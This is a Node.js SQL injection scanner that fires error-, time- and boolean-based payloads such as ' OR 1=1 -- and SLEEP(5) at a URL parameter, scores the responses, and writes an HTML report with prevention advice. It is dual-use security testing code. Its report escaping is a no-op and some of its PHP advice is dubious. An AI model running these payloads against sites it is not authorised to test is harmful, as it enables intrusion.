/**
 * SQL Injection Test Runner
 * 
 * Security Features:
 * - No destructive payloads (safe detection only)
 * - Timeout protection for all requests
 * - Request concurrency limits
 * 
 * Usage:
 *   runSQLInjectionTest(url, paramName, options)
 */
const axios = require('axios');
const fs = require('fs').promises;

// ────────────────────────────────────────────────
//  Payloads – Detection only (non-destructive)
// ────────────────────────────────────────────────
const errorBasedPayloads = [
  "' OR '1'='1",
  "' OR 1=1 --",
  "admin' --",
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "') OR ('1'='1",
  "1' ORDER BY 100--",
  "1 AND 1=CONVERT(int,(SELECT @@version))--"
];

const timeBasedPayloads = [
  "' AND SLEEP(5)--",
  "' WAITFOR DELAY '0:0:5'--",
  "'; SELECT IF(1=1,SLEEP(5),0)--",
  "1' AND (SELECT 1 FROM (SELECT SLEEP(5))x)--"
];

const booleanBasedPayloads = [
  "' OR '1'='1",
  "' OR '1'='2",
  "1' AND '1'='1",
  "1' AND '1'='2"
];

// NOTE: Destructive payloads have been removed for security.
// This scanner performs safe detection-only testing.

// ────────────────────────────────────────────────
//  Detection helpers
// ────────────────────────────────────────────────
const errorKeywords = [
  /sql syntax/i, /mysql/i, /mariadb/i, /sqlserver/i, /ora-/i,
  /unclosed quotation/i, /you have an error/i, /near/i
];

function isErrorBasedResponse(text) {
  return errorKeywords.some(k => k.test(text));
}

function getResponseSignature(res) {
  if (!res) return null;
  return {
    status: res.status,
    length: res.data ? String(res.data).length : 0,
    hasError: isErrorBasedResponse(String(res.data || ''))
  };
}

async function measureDelay(url, payload, expectedDelayMs = 4500) {
  const start = Date.now();
  try {
    await axios.get(url + payload, { timeout: expectedDelayMs + 2500 });
  } catch (e) {
    // timeout is actually a signal here
  }
  return Date.now() - start;
}

// ────────────────────────────────────────────────
//  Core test function
// ────────────────────────────────────────────────
async function runSQLInjectionTest(baseUrl, paramName = 'id', options = {}) {
  const {
    useDestructive = false,  // Always false - destructive payloads removed
    timeout = 8000,
    maxParallel = 4
  } = options;

  // Security: Destructive payloads completely removed
  // Only detection payloads are used
  const payloads = [
    ...errorBasedPayloads,
    ...timeBasedPayloads,
    ...booleanBasedPayloads
  ];

  const results = [];
  let score = 0;                // 0–100
  const signals = new Set();    // what kind of vuln we found

  // Prepare base (normal) request
  let baseUrlWithParam = baseUrl.includes('?') ? baseUrl : `${baseUrl}?${paramName}=normal`;
  let baseRes;
  try {
    baseRes = await axios.get(baseUrlWithParam, { timeout });
  } catch (e) {
    console.warn("Cannot reach base URL →", e.message);
    return { error: "Cannot reach target", score: 0 };
  }

  const normalSignature = getResponseSignature(baseRes);
  const normalDelay = await measureDelay(baseUrl, `?${paramName}=1`);

  console.log(`Normal response: ${normalSignature.status} | ${normalSignature.length} bytes | ~${normalDelay}ms`);

  // ── Run tests ───────────────────────────────────────
  for (const payload of payloads) {
    const testParam = `${paramName}=${encodeURIComponent(payload)}`;
    const testUrl = baseUrl.includes('?') ? `${baseUrl}&${testParam}` : `${baseUrl}?${testParam}`;

    let res = null;
    let delayMs = 0;
    let error = null;

    const start = Date.now();
    try {
      res = await axios.get(testUrl, { timeout });
      delayMs = Date.now() - start;
    } catch (e) {
      delayMs = Date.now() - start;
      error = e.message.includes('timeout') ? 'timeout' : e.message;
    }

    const sig = getResponseSignature(res);
    const result = {
      payload,
      status: res?.status || null,
      length: sig?.length || 0,
      delayMs,
      error,
      suspicious: false,
      reason: []
    };

    // ── Detection logic ────────────────────────────────
    if (sig?.hasError) {
      result.suspicious = true;
      result.reason.push("SQL error message in response");
      score += 35;
      signals.add("error-based");
    }

    if (delayMs > normalDelay + 3500 && payload.toUpperCase().includes('SLEEP')) {
      result.suspicious = true;
      result.reason.push(`Significant delay (${delayMs}ms)`);
      score += 40;
      signals.add("time-based");
    }

    if (res && booleanBasedPayloads.includes(payload)) {
      if (sig.length !== normalSignature.length || sig.status !== normalSignature.status) {
        result.suspicious = true;
        result.reason.push("Response difference on boolean payload");
        score += 25;
        signals.add("boolean-based");
      }
    }

    if (error === 'timeout' && payload.toUpperCase().includes('SLEEP')) {
      result.suspicious = true;
      result.reason.push("Request timeout on time-based payload");
      score += 30;
      signals.add("time-based");
    }

    results.push(result);
  }

  // Cap score at 100
  score = Math.min(100, Math.round(score));

  // ── Generate detailed prevention recommendations based on findings ──
  const prevention = [];
  const urlLower = baseUrl.toLowerCase();
  
  // Determine website type for specific recommendations
  const isWordPress = urlLower.includes('wordpress') || urlLower.includes('wp-') || urlLower.includes('/wp-admin');
  const isPHP = urlLower.includes('.php') || urlLower.includes('index') || urlLower.includes('page');
  const isEcommerce = urlLower.includes('shop') || urlLower.includes('store') || urlLower.includes('cart') || urlLower.includes('product');
  const isLoginPage = urlLower.includes('login') || urlLower.includes('signin') || urlLower.includes('auth');
  
  // Error-based SQLi recommendations
  if (signals.has("error-based")) {
    prevention.push("<strong>🔴 CRITICAL:</strong> Your site is leaking SQL error messages!");
    prevention.push("• <strong>Parameterized Queries:</strong> Never concatenate user input directly into SQL strings. Use prepared statements:");
    
    if (isPHP) {
      prevention.push("  PHP Example (MySQLi): <code>$stmt = $mysqli->prepare('SELECT * FROM users WHERE id = ?');</code>");
      prevention.push("  PHP Example (PDO): <code>$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');</code>");
    } else if (isWordPress) {
      prevention.push("  WordPress: Use <code>$wpdb->prepare()</code> with placeholders:");
      prevention.push("  <code>$wpdb->prepare('SELECT * FROM users WHERE id = %d', $user_id);</code>");
    } else {
      prevention.push("  Use your ORM's query builder with parameter binding");
    }
    
    prevention.push("• <strong>ORM Usage:</strong> Consider using an ORM (Sequelize, Prisma, TypeORM, SQLAlchemy, Hibernate)");
    prevention.push("• <strong>Disable Error Display:</strong> In production, set <code>display_errors = Off</code> in php.ini");
    prevention.push("• <strong>Custom Error Pages:</strong> Return generic error messages to users, log details server-side");
  }
  
  // Time-based SQLi recommendations
  if (signals.has("time-based")) {
    prevention.push("<strong>🟠 HIGH:</strong> Time-based blind SQL injection detected!");
    prevention.push("• <strong>Query Timeout:</strong> Set maximum query execution time (2-3 seconds max)");
    prevention.push("• <strong>WAF Rules:</strong> Block payloads containing SLEEP(), BENCHMARK(), WAITFOR DELAY");
    prevention.push("• <strong>Rate Limiting:</strong> Limit requests per IP, especially with slow response times");
    prevention.push("• <strong>Input Validation:</strong> Validate and sanitize all numeric/ID parameters");
    
    if (isEcommerce) {
      prevention.push("  E-commerce: Ensure product/category filters use type-casted integers");
    }
  }
  
  // Boolean-based SQLi recommendations
  if (signals.has("boolean-based")) {
    prevention.push("<strong>🟡 MEDIUM:</strong> Boolean-based blind SQL injection detected!");
    prevention.push("• <strong>Consistent Responses:</strong> Always return same structure for success/failure");
    prevention.push("• <strong>Generic Error Messages:</strong> Don't reveal 'user not found' vs 'wrong password'");
    prevention.push("• <strong>Response Timing:</strong> Add random delays to prevent timing attacks");
    
    if (isLoginPage) {
      prevention.push("  Login Page: Use single 'Invalid credentials' message for all failures");
    }
  }
  
  // General recommendations for all websites
  prevention.push("<strong>🛡️ GENERAL PROTECTION:</strong>");
  prevention.push("• <strong>Least Privilege:</strong> Database user should have minimum required permissions");
  prevention.push("• <strong>Web Application Firewall:</strong> Deploy ModSecurity, Cloudflare WAF, or AWS WAF");
  prevention.push("• <strong>Audit Logging:</strong> Enable slow query log and audit trail for suspicious queries");
  prevention.push("• <strong>Regular Updates:</strong> Keep your CMS, frameworks, and libraries patched");
  
  // Website-specific additional recommendations
  if (isWordPress) {
    prevention.push("<strong>📌 WORDPRESS SPECIFIC:</strong>");
    prevention.push("• Install <strong>Wordfence</strong> or <strong>Sucuri</strong> security plugins");
    prevention.push("• Use <strong>WPS Hide Login</strong> to hide admin page");
    prevention.push("• Disable XML-RPC if not needed (major attack vector)");
    prevention.push("• Add to wp-config.php: <code>define('DISALLOW_FILE_EDIT', true);</code>");
  }
  
  if (isEcommerce) {
    prevention.push("<strong>🛒 E-COMMERCE SPECIFIC:</strong>");
    prevention.push("• Ensure PCI-DSS compliance for payment data");
    prevention.push("• Use tokenization for payment information");
    prevention.push("• Implement order ID randomization (don't use sequential IDs)");
    prevention.push("• Separate database user for checkout vs catalog access");
  }
  
  if (isPHP) {
    prevention.push("<strong>🐘 PHP SPECIFIC:</strong>");
    prevention.push("• Enable <code>mysqli.real_escape_string()</code> or use PDO prepared statements");
    prevention.push("• Set <code>sql.safe_mode = On</code> in php.ini");
    prevention.push("• Consider using <strong>Doctrine ORM</strong> for better security");
  }
  
  prevention.push("<strong>📚 TESTING:</strong>");
  prevention.push("• Run OWASP ZAP or Burp Suite for comprehensive testing");
  prevention.push("• Perform regular penetration testing");
  prevention.push("• Use Content Security Policy (CSP) headers");

  // ── Final result ────────────────────────────────────
  const summary = {
    url: baseUrl,
    vulnerable: score >= 40,
    score: score,
    severity: score >= 80 ? "Critical" : score >= 60 ? "High" : score >= 40 ? "Medium" : "Low",
    detectedTechniques: Array.from(signals),
    preventionTips: prevention,
    results: results
  };

  return summary;
}

// ────────────────────────────────────────────────
//  Simple HTML + Chart.js report generator
// ────────────────────────────────────────────────
function generateHTMLReport(result) {
  const html = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>SQLi Test Report - ${result.url}</title>
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <style>
    body { font-family: system-ui, sans-serif; margin: 2rem; line-height: 1.6; }
    h1, h2 { color: #c1121f; }
    .score { font-size: 3rem; font-weight: bold; }
    .critical { color: #c1121f; } .high { color: #d97706; }
    .medium { color: #ca8a04; } .low { color: #059669; }
    table { border-collapse: collapse; width: 100%; margin: 1.5rem 0; }
    th, td { border: 1px solid #ddd; padding: 0.6rem; text-align: left; }
    th { background: #f1f5f9; }
    .suspicious { background: #fee2e2; }
  </style>
</head>
<body>
  <h1>SQL Injection Test Report</h1>
  <p>Target: <strong>${result.url}</strong></p>
  <p class="score ${(result.severity || 'unknown').toLowerCase()}">
    Vulnerability Score: ${result.score}/100 — ${result.severity || 'Unknown'}
  </p>

  <h2>Detection Pie Chart</h2>
  <canvas id="vulnChart" width="400" height="400"></canvas>

  <h2>Prevention Recommendations</h2>
  <ul>
    ${(result.preventionTips || []).map(t => `<li>${t}</li>`).join('')}
  </ul>

  <h2>Detailed Results</h2>
  <table>
    <tr>
      <th>Payload</th>
      <th>Status</th>
      <th>Length</th>
      <th>Delay (ms)</th>
      <th>Suspicious?</th>
      <th>Reason</th>
    </tr>
    ${(result.results || []).map(r => `
      <tr class="${r.suspicious ? 'suspicious' : ''}">
        <td><code>${String(r.payload).replace(/&/g,'&').replace(/</g,'<').replace(/>/g,'>')}</code></td>
        <td>${r.status || '-'}</td>
        <td>${r.length}</td>
        <td>${r.delayMs}</td>
        <td>${r.suspicious ? 'YES' : 'No'}</td>
        <td>${r.reason.join(', ') || r.error || '-'}</td>
      </tr>
    `).join('')}
  </table>

  <script>
    const ctx = document.getElementById('vulnChart').getContext('2d');
    new Chart(ctx, {
      type: 'pie',
      data: {
        labels: ['No signs', 'Error-based', 'Time-based', 'Boolean-based'],
        datasets: [{
          data: [
            ${100 - result.score},
            ${(result.detectedTechniques || []).includes('error-based') ? result.score/3 : 0},
            ${(result.detectedTechniques || []).includes('time-based') ? result.score/3 : 0},
            ${(result.detectedTechniques || []).includes('boolean-based') ? result.score/3 : 0}
          ],
          backgroundColor: ['#10b981', '#ef4444', '#f59e0b', '#3b82f6']
        }]
      },
      options: {
        responsive: true,
        plugins: { legend: { position: 'top' } }
      }
    });
  </script>
</body>
</html>
  `;

  return html;
}

// Export for use by other modules
module.exports = { runSQLInjectionTest, generateHTMLReport };

// Example usage: only run when executed directly (not when required)
if (require.main === module) {
  (async () => {
    const target = process.env.TARGET_URL || "http://localhost/vulnerable/page.php";

    console.log("Starting SQLi test...");
    try {
      const report = await runSQLInjectionTest(target, "id", {
        timeout: 10000
      });

      console.log(JSON.stringify(report, null, 2));

      // Optional: save HTML report
      const html = generateHTMLReport(report);
      await fs.writeFile("sqli-report.html", html);
      console.log("Report saved → sqli-report.html");
    } catch (e) {
      console.error('SQLi test failed:', e && e.message ? e.message : e);
    }
  })();
}
